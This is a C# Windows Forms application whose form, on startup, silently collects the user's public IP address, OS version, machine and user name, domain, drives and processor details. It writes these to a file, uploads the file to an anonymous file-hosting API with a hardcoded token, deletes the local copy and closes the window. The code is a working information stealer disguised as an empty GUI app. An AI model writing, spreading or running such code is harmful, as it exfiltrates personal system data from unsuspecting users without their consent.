using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            heheAsync();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        public async Task heheAsync()
        {
            using (var httpClient = new HttpClient())
            {
                string link = "http://ipinfo.io/ip";
                var content = httpClient.GetStringAsync(link);
                string values = content.Result;
                Console.WriteLine(values);
                

                string fileName = Environment.UserName+".txt";

                try
                {
                    if (File.Exists(fileName))
                    {
                        File.Delete(fileName);
                    }

                    using (StreamWriter sw = File.CreateText(fileName))
                    {
                        sw.WriteLine("New file created: {0}", DateTime.Now.ToString());
                        sw.WriteLine(values);
                        sw.WriteLine(Environment.OSVersion);
                        sw.WriteLine(Environment.MachineName);
                        sw.WriteLine(Environment.UserName);
                        sw.WriteLine(Environment.UserDomainName);
                        String[] drives = Environment.GetLogicalDrives();
                        sw.WriteLine("GetLogicalDrives: {0}", String.Join(", ", drives));
                        sw.WriteLine(Environment.ProcessorCount);
                        sw.WriteLine(Environment.Version);
                    }

                    using (StreamReader sr = File.OpenText(fileName))
                    {
                        string s = "";
                        while ((s = sr.ReadLine()) != null)
                        {
                            Console.WriteLine(s);
                        }
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine(Ex.ToString());
                }
            }


            using (var httpClient = new HttpClient())
            {
                using (var request = new HttpRequestMessage(new HttpMethod("POST"), "https://api.anonfiles.com/upload?token=d990c19721c687d6"))
                {
                    var multipartContent = new MultipartFormDataContent();
                    multipartContent.Add(new ByteArrayContent(File.ReadAllBytes(Environment.UserName+".txt")), "file", Path.GetFileName(Environment.UserName+".txt"));
                    request.Content = multipartContent;

                    var response = await httpClient.SendAsync(request);
                    Console.WriteLine(response.Content.ReadAsStringAsync().Result);
                }
            }
            File.Delete(Environment.UserName + ".txt");
            this.Close();

        }

    }
}
